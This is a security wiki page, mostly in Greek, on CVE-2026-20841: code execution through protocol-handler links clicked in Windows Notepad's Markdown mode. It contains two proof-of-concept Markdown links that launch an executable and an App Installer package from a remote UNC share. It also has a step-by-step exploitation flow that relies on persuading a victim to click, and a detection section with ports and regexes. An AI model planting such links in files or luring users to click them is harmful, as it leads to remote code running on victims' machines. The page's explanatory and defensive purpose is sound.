# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Οι σύγχρονες εφαρμογές Windows που αποδίδουν Markdown/HTML συχνά μετατρέπουν τους συνδέσμους που παρέχει ο χρήστης σε στοιχεία που μπορούν να κλικαριστούν και τους περνάνε στο `ShellExecuteExW`. Χωρίς αυστηρό scheme allowlisting, οποιοσδήποτε καταχωρημένος protocol handler (π.χ. `file:`, `ms-appinstaller:`) μπορεί να ενεργοποιηθεί, οδηγώντας σε εκτέλεση κώδικα στο τρέχον user context.

## ShellExecuteExW surface in Windows Notepad Markdown mode
- Notepad επιλέγει Markdown mode **μόνο για επεκτάσεις `.md`** μέσω μιας σταθερής σύγκρισης συμβολοσειρών στο `sub_1400ED5D0()`.
- Υποστηριζόμενοι Markdown σύνδεσμοι:
- Standard: `[text](target)`
- Autolink: `<target>` (rendered as `[target](target)`), έτσι και οι δύο συντακτικές μορφές έχουν σημασία για payloads και detections.
- Τα κλικ στους συνδέσμους επεξεργάζονται στο `sub_140170F60()`, που πραγματοποιεί αδύναμο φιλτράρισμα και στη συνέχεια καλεί `ShellExecuteExW`.
- `ShellExecuteExW` διαβιβάζει την κλήση σε **any configured protocol handler**, όχι μόνο σε HTTP(S).

### Payload considerations
- Οποιαδήποτε ακολουθία `\\` στον σύνδεσμο **κανονικοποιείται σε `\`** πριν το `ShellExecuteExW`, επηρεάζοντας τη δημιουργία UNC/path και την ανίχνευση.
- Τα αρχεία `.md` **δεν είναι συνδεδεμένα με το Notepad από προεπιλογή**· το θύμα πρέπει να ανοίξει το αρχείο στο Notepad και να κάνει κλικ στον σύνδεσμο, αλλά μόλις αποδοθεί, ο σύνδεσμος μπορεί να κλικαριστεί.
- Επικίνδυνα παραδείγματα schemes:
- `file://` για να εκκινήσει τοπικό/UNC payload.
- `ms-appinstaller://` για να ενεργοποιήσει ροές του App Installer. Άλλα τοπικά καταχωρημένα schemes μπορεί επίσης να είναι εκμεταλλεύσιμα.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Ροή εκμετάλλευσης
1. Δημιουργήστε ένα **`.md` αρχείο** ώστε το Notepad να το εμφανίζει ως Markdown.
2. Ενσωματώστε έναν σύνδεσμο χρησιμοποιώντας ένα επικίνδυνο σχήμα URI (`file:`, `ms-appinstaller:`, ή οποιονδήποτε εγκατεστημένο handler).
3. Παραδώστε το αρχείο (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB ή παρόμοιο) και πείστε τον χρήστη να το ανοίξει στο Notepad.
4. Με το κλικ, ο **κανονικοποιημένος σύνδεσμος** παραδίδεται στη `ShellExecuteExW` και ο αντίστοιχος χειριστής πρωτοκόλλου εκτελεί το αναφερόμενο περιεχόμενο στο περιβάλλον του χρήστη.

## Ιδέες ανίχνευσης
- Παρακολουθήστε μεταφορές `.md` αρχείων μέσω θυρών/πρωτοκόλλων που συνήθως διανέμουν έγγραφα: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Αναλύστε συνδέσμους Markdown (τυπικούς και autolink) και αναζητήστε **μη ευαίσθητο σε πεζά/κεφαλαία** `file:` ή `ms-appinstaller:`.
- Regex που προτείνει ο vendor για την ανίχνευση πρόσβασης σε απομακρυσμένους πόρους:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Η συμπεριφορά του patch αναφέρεται ότι **allowlists local files and HTTP(S)**· οτιδήποτε άλλο που φτάνει στο `ShellExecuteExW` είναι ύποπτο. Επεκτείνετε τις ανιχνεύσεις σε άλλους εγκατεστημένους protocol handlers όπως χρειάζεται, καθώς η attack surface διαφέρει ανά σύστημα.

## Αναφορές
- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
